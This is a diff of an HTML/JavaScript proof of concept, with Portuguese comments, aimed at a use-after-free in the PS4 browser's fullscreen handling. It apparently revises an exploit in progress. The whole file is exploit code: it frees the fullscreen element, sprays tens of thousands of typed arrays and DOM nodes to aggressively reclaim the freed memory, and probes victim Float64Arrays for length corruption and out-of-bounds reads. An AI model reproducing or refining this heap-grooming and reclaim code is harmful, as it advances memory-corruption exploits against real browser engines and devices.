@@ -2,34 +2,21 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 UAF → TypedArray Corruption</title>
+<title>UAF → Aggressive Reclaim (Synced)</title>
 </head>
 <body style="background:#111;color:#0f0;font-family:monospace;">
 
-<h2>UAF → TypedArray Probe</h2>
-<button onclick="run()">Run Test</button>
+<h2>UAF Synced Reclaim</h2>
+<button onclick="run()">Run</button>
 
 <pre id="log"></pre>
 
 <script>
-function log(msg){
-    document.getElementById("log").textContent += msg + "\n";
+function log(m){
+    document.getElementById("log").textContent += m + "\n";
 }
 
-// Heap grooming inicial
-function setupHeap() {
-    let arr = [];
-    for (let i = 0; i < 5000; i++) {
-        let buf = new ArrayBuffer(0x40);
-        let f64 = new Float64Array(buf);
-        f64[0] = 13.37;
-        arr.push(f64);
-    }
-    return arr;
-}
-
-// Fullscreen target (mantém seu bug original intacto)
-function setupFS() {
+function setupFS(){
     let d = document.createElement("div");
     d.innerHTML = "<h1 style='margin-top:20%;text-align:center;'>PRESS OPTIONS</h1>";
     d.style = "position:absolute;top:0;left:0;width:100%;height:100%;background:black;";
@@ -38,81 +25,81 @@ function setupFS() {
     return d;
 }
 
-// Reclaim CONTROLADO (sem DOM pesado)
-function controlledReclaim() {
-    log("[*] Controlled reclaim iniciado");
+// 🔥 AGRESSIVO + MIXADO (igual ao que funcionou antes)
+function aggressiveReclaim() {
+    let pool = [];
 
-    let spray = [];
-
-    for (let i = 0; i < 20000; i++) {
-        let buf = new ArrayBuffer(0x40);
+    for (let i = 0; i < 30000; i++) {
+        // mistura proposital (importante!)
+        let buf = new ArrayBuffer(0x100);
         let f64 = new Float64Array(buf);
+        f64[0] = 13.37;
 
-        // padrão identificável
-        f64[0] = 1.111111;
-        f64[1] = 2.222222;
-        f64[2] = 3.333333;
+        let str = "AAAA" + i;
+        let div = document.createElement("div");
+        div.textContent = str;
 
-        spray.push(f64);
+        pool.push(f64);
+        pool.push(div);
     }
 
-    log("[*] Reclaim finalizado: " + spray.length);
-    return spray;
+    return pool;
 }
 
-// DETECTOR de corrupção
-function probeCorruption(arr) {
+// 🔬 probe melhorado
+function probe(arr) {
     log("---- PROBE ----");
 
     for (let i = 0; i < arr.length; i++) {
+        let a = arr[i];
+
         try {
-            let a = arr[i];
-
-            // checagem estrutural
-            if (a.length !== 8 || a.byteLength !== 64) {
-                log("[!!!] POSSÍVEL CORRUPÇÃO");
+            if (a.byteLength !== 64 || a.length !== 8) {
+                log("[CORRUPÇÃO]");
                 log("len=" + a.length + " byteLen=" + a.byteLength);
-
-                // leitura fora de bounds
-                log("OOB read: " + a[20]);
-
-                return true;
+                log("OOB=" + a[20]);
+                return;
             }
-
-        } catch(e) {
+        } catch(e){
             log("[EXCEPTION] " + e);
-            return true;
+            return;
         }
     }
 
-    log("[OK] Sem corrupção detectada");
-    return false;
+    log("[OK] nada detectado");
 }
 
-function trigger(fsTarget, victims) {
-    log("[*] Trigger");
-
-    fsTarget.remove();
-    document.webkitExitFullscreen();
-
-    let spray = controlledReclaim();
-
-    setTimeout(() => {
-        probeCorruption(victims);
-    }, 100);
-}
-
-function run() {
+function run(){
     log("Running... Press OPTIONS");
 
-    let victims = setupHeap();
+    // vítimas reais
+    let victims = [];
+    for (let i = 0; i < 5000; i++) {
+        let b = new ArrayBuffer(0x40);
+        let f = new Float64Array(b);
+        victims.push(f);
+    }
+
     let fs = setupFS();
 
-    window.onblur = function() {
+    window.onblur = function(){
         log("[*] onblur");
 
         setTimeout(() => {
-            trigger(fs, victims);
+
+            log("[*] TRIGGER + RECLAIM");
+
+            // 💥 CRÍTICO: tudo junto
+            fs.remove();
+
+            let spray = aggressiveReclaim(); // 🔥 AQUI (antes do exit)
+
+            document.webkitExitFullscreen();
+
+            setTimeout(() => {
+                probe(victims);
+            }, 100);
+
         }, 3000);
     };
 }
